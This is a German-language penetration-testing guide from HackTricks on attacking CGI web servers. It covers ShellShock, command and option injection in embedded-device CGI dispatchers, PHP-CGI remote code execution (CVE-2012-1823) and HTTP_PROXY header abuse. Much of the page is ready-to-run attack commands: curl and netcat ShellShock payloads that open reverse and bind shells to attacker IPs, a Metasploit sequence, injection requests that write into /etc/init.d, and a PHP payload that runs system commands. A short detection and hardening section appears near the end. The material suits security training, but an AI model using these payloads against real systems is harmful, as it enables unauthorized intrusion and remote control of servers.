# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Informationen

Die **CGI scripts sind perl scripts**, daher kannst du, wenn du einen Server kompromittiert hast, der _**.cgi**_ Skripte ausführen kann, eine **perl reverse shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\) hochladen, die **Dateiendung** von **.pl** auf **.cgi** ändern, **Ausführungsrechte** setzen \(`chmod +x`\) und die Reverse-Shell **über den Webbrowser** aufrufen, um sie auszuführen.
Um auf **CGI vulns** zu testen, empfiehlt sich `nikto -C all` \(und alle Plugins\)

## **ShellShock**

**ShellShock** ist eine **Schwachstelle**, die die weit verbreitete **Bash** Kommandozeile in Unix-basierten Betriebssystemen betrifft. Sie zielt auf die Fähigkeit von Bash, von Anwendungen übergebene Befehle auszuführen. Die Schwachstelle liegt in der Manipulation von **Umgebungsvariablen**, das sind dynamische benannte Werte, die beeinflussen, wie Prozesse auf einem Rechner ausgeführt werden. Angreifer können dies ausnutzen, indem sie **bösartigen Code** an Umgebungsvariablen anhängen, der beim Empfangen der Variablen ausgeführt wird. Dadurch können Angreifer potenziell das System kompromittieren.

Beim Ausnutzen dieser Schwachstelle kann die Seite einen Fehler zurückgeben.

Du kannst diese Schwachstelle finden, indem du bemerkst, dass eine **alte Apache-Version** und **cgi_mod** (mit cgi Ordner) verwendet wird, oder indem du **nikto** einsetzt.

### **Test**

Die meisten Tests basieren darauf, mit echo etwas auszugeben und zu erwarten, dass dieser String in der Webantwort zurückkommt. Wenn du denkst, eine Seite könnte verwundbar sein, suche alle cgi-Seiten und teste sie.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind and out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## Centralized CGI dispatchers (single endpoint routing via selector parameters)

Viele eingebettete Web-UIs multiplexen Dutzende privilegierte Aktionen hinter einem einzigen CGI-Endpoint (zum Beispiel `/cgi-bin/cstecgi.cgi`) und verwenden einen Selector-Parameter wie `topicurl=<handler>`, um die Anfrage an eine interne Funktion zu routen.

Methodik, um diese Router auszunutzen:

- Handler-Namen enumerieren: JS/HTML scrapen, brute-force mit wordlists, oder Firmware entpacken und nach Handler-Strings grep'en, die vom Dispatcher verwendet werden.
- Unauthentifizierte Erreichbarkeit testen: Manche Handler vergessen Auth-Checks und sind direkt aufrufbar.
- Auf Handler fokussieren, die system utilities aufrufen oder Dateien berühren; schwache Validatoren blockieren oft nur wenige Zeichen und übersehen möglicherweise den führenden Hyphen `-`.

Generische Exploit-Muster:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Erkennung und Härtung:

- Achten Sie auf unauthentifizierte Anfragen an zentralisierte CGI-Endpunkte mit `topicurl`, die auf sensible Handler zeigen.
- Markiere Parameter, die mit `-` beginnen (Versuche einer argv-Optionen-Injektion).
- Anbieter: Erzwingen Sie Authentifizierung für alle zustandsändernden Handler, validieren Sie mittels strikter Allowlists/Typen/Längen und übergeben Sie niemals vom Benutzer kontrollierte Zeichenketten als Kommandozeilen-Flags.

## Altes PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Grundsätzlich: Wenn cgi aktiv ist und PHP "alt" \(&lt;5.3.12 / &lt; 5.4.2\), kann Code ausgeführt werden.
Um diese Schwachstelle auszunutzen, muss auf eine PHP-Datei des Webservers zugegriffen werden, ohne Parameter zu senden \(insbesondere ohne das Zeichen "=" zu senden\).
Um die Schwachstelle zu testen, kann man z. B. `/index.php?-s` aufrufen \(beachte `-s`\) und **der Quellcode der Anwendung erscheint in der Antwort**.

Um **RCE** zu erreichen, kann folgende spezielle Anfrage gesendet werden: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` und der **PHP code** wird im **Body der Anfrage** ausgeführt.
Beispiel:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Mehr Informationen über die vuln und mögliche exploits:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM an Webserver-Anfragen\)**

CGI erstellt eine Umgebungsvariable für jeden Header in der HTTP-Anfrage. Zum Beispiel: "host:web.com" wird als "HTTP_HOST"="web.com" angelegt.

Da die Variable HTTP_PROXY vom Webserver verwendet werden kann, versuche einen **Header** zu senden, der folgendes enthält: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**". Wenn der Server während der Session irgendwelche Requests ausführt, kannst du jede vom Server getätigte Anfrage mitschneiden.

## **Referenzen**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
